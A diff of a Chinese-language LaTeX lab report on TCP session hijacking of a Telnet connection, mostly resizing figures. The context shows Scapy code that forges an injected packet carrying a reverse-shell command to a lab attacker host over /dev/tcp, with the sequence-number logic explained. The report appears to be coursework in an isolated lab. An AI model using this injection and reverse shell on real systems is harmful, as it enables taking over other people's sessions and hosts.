@@ -37,7 +37,7 @@ telnet 192.168.4.105 23
 
 \begin{figure}[H]
     \centering
-    \includegraphics[trim=720bp 0 0 0,clip,width=0.88\linewidth]{figures/task4/telnet_login(1).png}
+    \includegraphics[trim=720bp 0 0 0,clip,width=0.74\linewidth]{figures/task4/telnet_login(1).png}
     \caption{攻击前，User 正常登录受害者服务器的 \texttt{Telnet} 会话}
     \label{fig:task4-telnet}
 \end{figure}
@@ -48,6 +48,7 @@ telnet 192.168.4.105 23
 
 脚本将注入报文的源、目的 IP 与端口设置为原会话的反向方向，并设置 \texttt{PA} 标志。注入序列号取捕获报文的 ACK；注入确认号取捕获报文的序列号加负载长度，并按 32 位序号空间取值。核心代码如下：
 
+\Needspace{27\baselineskip}
 \begin{lstlisting}[language=Python,caption={根据捕获的 \texttt{Telnet} 报文构造一次 \texttt{TCP} 会话注入}]
 SPOOFED_PAYLOAD = (
     b"\n/bin/bash -i > /dev/tcp/192.168.2.100/9999 "
@@ -79,7 +80,7 @@ send(forged_packet, iface=INTERFACE, verbose=False)
 
 \begin{figure}[H]
     \centering
-    \includegraphics[trim=720bp 0 0 0,clip,width=0.88\linewidth]{figures/task4/injection(1).png}
+    \includegraphics[trim=720bp 0 0 0,clip,width=0.76\linewidth]{figures/task4/injection(1).png}
     \caption{Attacker 捕获 \texttt{Telnet} 报文并发送会话注入数据}
     \label{fig:task4-injection}
 \end{figure}
@@ -92,7 +93,7 @@ send(forged_packet, iface=INTERFACE, verbose=False)
 
 \begin{figure}[H]
     \centering
-    \includegraphics[trim=720bp 387bp 0 0,clip,width=0.94\linewidth]{figures/task4/shell_verification(1).png}
+    \includegraphics[trim=720bp 387bp 0 0,clip,width=0.86\linewidth]{figures/task4/shell_verification(1).png}
     \caption{反向连接后在受害者实验账户下核对身份、主机名和地址}
     \label{fig:task4-shell}
 \end{figure}
